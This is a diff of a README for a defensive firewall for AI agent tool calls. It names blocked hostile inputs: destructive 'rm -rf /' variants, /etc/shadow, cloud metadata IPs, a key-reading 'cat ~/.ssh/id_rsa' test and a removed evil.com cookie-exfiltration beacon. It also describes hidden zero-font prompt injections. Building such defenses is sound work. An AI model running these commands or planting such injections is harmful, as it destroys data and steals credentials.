@@ -1,7 +1,7 @@
 # 🛡️ Aegis: Sovereign Negative Security Gate & Agentic Firewall
 
 [![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
-[![Tests](https://img.shields.io/badge/tests-19%20passed%20(4ms)-brightgreen.svg)]()
+[![Tests](https://img.shields.io/badge/tests-48%20passed%20(48%2F48)-brightgreen.svg)]()
 [![Tokens](https://img.shields.io/badge/token%20spend-%E2%82%AC0%20(zero)-brightgreen.svg)]()
 [![Model](https://img.shields.io/badge/architecture-monotonic%20negative%20gate-blueviolet.svg)]()
 
@@ -10,19 +10,21 @@
 
 ---
 
-## ⚡ The Fundamental Flaw in Current AI Guardrails
+## ⚡ Defense-in-Depth vs LLM-as-a-Judge
 
-Almost all modern "AI guardrails" (NeMo, Llama Guard, Guardrails AI) rely on **an LLM to judge another LLM**. This is dangerous and costly:
-* **Vulnerable to Prompt Injection:** If an attacker can trick the primary model, they can trick the judge model.
-* **Prohibitive Cost & Latency:** Adds 500ms–2000ms and spends paid tokens on every single user turn and tool call.
-* **Positive Failure Modes:** When the judge LLM hallucinates or times out, systems often fail open.
+Many guardrail implementations rely heavily on **prompting a second LLM to evaluate the primary LLM**. While flexible, this introduces critical tradeoffs:
+* **Token Costs & Latency:** Adds 500ms–2000ms and paid token spend to every user turn and tool call.
+* **Adversarial Jailbreaks:** If an attacker crafts a bypass that fools the judge model, the guardrail collapses.
+* **Positive Failure Modes:** When judge calls fail or timeout, systems frequently fail open.
 
-### The Aegis Invariant: Mathematical Negative Gating
+### The Aegis Invariant: Deterministic Negative Gating
 
-Aegis takes the opposite approach. It is a **deterministic, sub-millisecond, zero-token software firewall** operating at the tool, syscall, and network boundaries:
-1. **Immune to Prompt Injection:** An LLM cannot "convince" Aegis to grant permissions. Aegis does not reason with the model; it mathematically enforces boundaries.
-2. **Strict Monotonicity:** Decisions follow a strict partially ordered scale (`PASS < OBSERVE < WARN < RESTRICT < DENY < LOCK`). Once an agent session violates a rule, its privileges escalate upwards and cannot be de-escalated by the agent.
-3. **Sub-Millisecond Speed & Zero Token Spend:** Evaluates ASTs, canonicalized paths, and IP boundaries in under `0.005s` with zero external API calls.
+Aegis implements a **fast, zero-token deterministic software gate** operating at the tool, syscall, and network boundaries:
+1. **Model-Independent Policy:** Aegis does not negotiate or reason with LLMs. An agent cannot persuade or jailbreak the gate, because evaluation relies on canonicalized paths, argument ASTs, tokenized commands, and IP resolution.
+2. **Strict Monotonicity:** Decisions follow a strict mathematical poset: `PASS < OBSERVE < WARN < ASK < RESTRICT < DENY < LOCK`. Once an agent session violates a rule, its privileges escalate upwards and cannot be de-escalated by the agent. Only an authenticated owner secret can reset quarantine.
+3. **Human-in-the-Loop (`ASK`):** Sensitive or ambiguous mutations trigger an `ASK` verdict that routes directly to an owner approval queue (e.g. Tekton).
+4. **Defense-in-Depth Pairing:** String checks provide boundary policy gating. For maximum defense, Aegis is designed to pair with OS sandboxing (containers, Bubblewrap, or seccomp) to contain lower-level execution.
+5. **Zero Token Overhead:** Evaluates payloads in microseconds with zero external dependencies (pure Python standard library).
 
 ---
 
@@ -35,11 +37,11 @@ Aegis takes the opposite approach. It is a **deterministic, sub-millisecond, zer
 ┌─────────────────────────────────────────────────────────────┐
 │                 AEGIS SOVEREIGN NEGATIVE GATE               │
 │                                                             │
-│  🌀 Labyrinth Clan:       Path traversal / path escape      │
-│  🛡️ Tartarus Boundary:    Command injection / shell traps   │
-│  🗝️ Credential Custody:    API key leaks / SSRF metadata     │
-│  ⚔️ Hecatoncheires:       Race conditions / infinite loops  │
-│  🛑 Monotonic Scale:      PASS ➔ WARN ➔ RESTRICT ➔ LOCK     │
+│  🌀 Labyrinth Clan:       Path traversal & directory escape │
+│  🛡️ Tartarus Boundary:    Command injection & destructive ops│
+│  🗝️ Credential Custody:    API keys / SSRF & cloud metadata  │
+│  ⚔️ Hecatoncheires:       Race conditions & loop brakes     │
+│  🛑 Monotonic Poset:      PASS ➔ ASK ➔ DENY ➔ LOCK          │
 └──────────────────────────────┬──────────────────────────────┘
                                │
                 ▲ BLOCKED      │ APPROVED (Zero Authority Added)
@@ -47,22 +49,17 @@ Aegis takes the opposite approach. It is a **deterministic, sub-millisecond, zer
           [ Quarantine ]  [ OS / Tool Execution ]
 ```
 
-1. **🌀 Labyrinth Clan:** Absolute path containment, null-byte truncation defense, recursive multi-level URL unquoting (`%252e%252e`), and symlink escape prevention.
-2. **🛡️ Tartarus Clan:** Shell chaining detection (`;`, `&&`, `||`, backticks, `$()`), command tokenization via `shlex`, catastrophic command blocking (`rm -rf /`, `mkfs`), and SQL injection filtering.
-3. **🗝️ Credential Custody Clan:** Zero-egress boundary for Cloud Instance Metadata (`169.254.169.254`, `metadata.google.internal`), RFC1918 intranet blocking, hex/dword IP normalization, and regex secret scanning (RSA keys, AWS tokens, GitHub tokens, JWTs).
-4. **⚔️ Hecatoncheires Clan:** Runaway agent loop detection (trips emergency brake when an agent loops identical tool calls), rapid escalation limits, and concurrency lock guards.
+1. **🌀 Labyrinth Clan:** Absolute path containment, null-byte truncation defense, recursive multi-level URL unquoting (`%252e%252e`), Windows ADS defense (`::$data`), and sensitive system path protection (`/etc/shadow`, SAM registry).
+2. **🛡️ Tartarus Clan:** Shell chaining detection (`;`, `&&`, `||`, subshells), tokenized command analysis via `shlex`, flag permutation detection (`rm -fr /`, `rm -r -f /`, `find / -delete`), and safe workspace command differentiation.
+3. **🗝️ Credential Custody Clan:** Zero-egress boundary for Cloud Instance Metadata (`169.254.169.254`, `metadata.google.internal`), RFC1918 intranet blocking, BSD short IP / hex / octal normalization (`127.1`, `0x7f.1`), DNS rebinding defense (`nip.io`), and secret scanning (Anthropic, Stripe, GitHub, Slack, Google, and RSA/EC PEM keys).
+4. **⚔️ Hecatoncheires Clan:** Runaway agent loop detection (trips emergency brake when an agent repeats identical tool arguments > threshold), thread-safe shared gate synchronization, and rapid escalation brakes.
 
 ---
 
 ## 🚀 Use Cases & Integration Modes
 
-### 1. 🌐 Browser Extension ("AdBlocker for AI Agents")
-Available under `browser-extension/`:
-* Manifest V3 extension that intercepts invisible zero-font prompt injections (`font-size: 0px`, opacity 0, background-matching colors) embedded in untrusted web pages before web-browsing agents can ingest them.
-* Blocks data-exfiltration image beacons (`<img src="https://evil.com/leak?cookie=...">`).
-
-### 2. 🪢 Agent Harness Interceptor (SWE-bench, LangChain, AutoGen, CrewAI)
-Wrap any Python tool or agent harness to enforce fail-closed execution:
+### 1. 🪢 Agent Harness Interceptor (SWE-bench, LangChain, AutoGen, CrewAI)
+Wrap any Python tool or agent harness to enforce fail-closed execution with recursive argument traversal and automatic positional argument binding:
 
 ```python
 from aegis import AegisGate, AegisHarness
@@ -72,13 +69,13 @@ harness = AegisHarness(gate)
 
 @harness.protect_tool
 def execute_bash(command: str):
-    # If the agent attempts injection or destructive commands,
+    # If the agent attempts command injection or path escape,
     # Aegis raises PermissionError before this function ever runs.
     return os.system(command)
 ```
 
-### 3. 🔌 Model Context Protocol (MCP) Security Proxy
-Protect Claude Desktop, Cursor, and Antigravity:
+### 2. 🔌 Model Context Protocol (MCP) Security Proxy
+Protect Claude Desktop, Cursor, and Antigravity with request gating and response leak filtering:
 
 ```python
 from aegis import AegisMcpProxy
@@ -89,15 +86,45 @@ if not should_forward:
     send_to_client(error_response)
 ```
 
-### 4. 🖥️ Desktop Daemon & Standalone REST API
-Run Aegis in the background for local desktop tools:
+### 3. 🖥️ Desktop Daemon & Standalone REST API
+Run Aegis as a local background security daemon:
 
 ```bash
-aegis serve --port 9999
+aegis serve --port 9999 --base-dir ./workspace
 ```
 
-* `GET  http://127.0.0.1:9999/status` -> Live monotonic scale & telemetry
+* `GET  http://127.0.0.1:9999/status` -> Live monotonic scale & telemetry snapshot
 * `POST http://127.0.0.1:9999/gate`   -> Real-time tool call evaluation
+
+### 4. 🌐 Browser Extension ("AdBlocker for AI Agents")
+Available under `browser-extension/`:
+* Manifest V3 extension that intercepts zero-font prompt injections (`font-size: 0px`, opacity 0, background-matching colors) embedded in untrusted web pages.
+
+---
+
+## 🛠️ CLI Quickstart
+
+```bash
+# Scan a codebase for OWASP and secret violations
+aegis audit ./my-project
+
+# Test a tool call against the gate
+aegis gate run_command '{"command": "cat ~/.ssh/id_rsa"}' --base-dir ./workspace
+
+# Launch the daemon
+aegis serve --port 9999 --base-dir ./workspace
+```
+
+---
+
+## 🧪 Verification & Testing
+
+Aegis is completely self-contained with **zero runtime external dependencies** (uses Python standard library primitives).
+
+```bash
+python -m unittest discover -s tests -t .
+# Ran 48 tests in ~3.6s (includes 1,000+ payload fuzzing battery and 10,000-eval shared gate concurrency hammer)
+```
 
 ### 5. 🏔️ OTHRYS Native Integration
 Aegis serves as the sovereign Security Authority across the OTHRYS fleet:
